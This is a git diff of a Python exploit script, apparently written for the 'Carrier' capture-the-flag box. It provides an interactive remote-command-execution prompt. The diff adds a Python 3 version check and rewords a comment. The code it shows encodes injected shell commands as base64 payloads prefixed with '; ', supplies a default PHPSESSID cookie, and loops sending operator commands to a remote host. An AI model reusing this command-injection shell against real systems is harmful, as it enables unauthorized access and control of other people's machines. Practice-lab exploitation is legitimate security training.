@@ -1,4 +1,4 @@
-import requests, base64, argparse
+import requests, base64, argparse, sys
 
 parser = argparse.ArgumentParser(description='Program to get an RCE shell interface on the Carrier box. Made by 0xMurphy')
 parser.add_argument('-c','--cookie', help='PHPSESSID')
@@ -6,7 +6,12 @@ parser.add_argument('rhost', help='Remote host IP')
 args = parser.parse_args()
 
 USERNAME='admin'
-PASSWORD=''		# Removed since box is still active.
+PASSWORD=''		# Removed because box is still active.
+
+def checkVersion():
+	if sys.version_info[0] < 3:
+		print('Please use Python 3.x...')
+		sys.exit()
 
 def payload(t):
 	return base64.b64encode(('; '+t).encode()).decode()
@@ -30,11 +35,7 @@ def exploit():
 	if not args.cookie:
 		args.cookie='authBy0xMurphy'
 	while True:
-		try:
-			i = input('RCE@'+args.rhost+'> ')
-		except:
-			print("Please use Python 3.x to run...")
-			break
+		i = input('RCE@'+args.rhost+'> ')
 		if i=='exit':
 			break
 		if i.split()[0] == 'load':
@@ -64,4 +65,5 @@ System Information
 			print(consolify(r.text))
 
 if __name__ == '__main__':
+	checkVersion()
 	exploit()
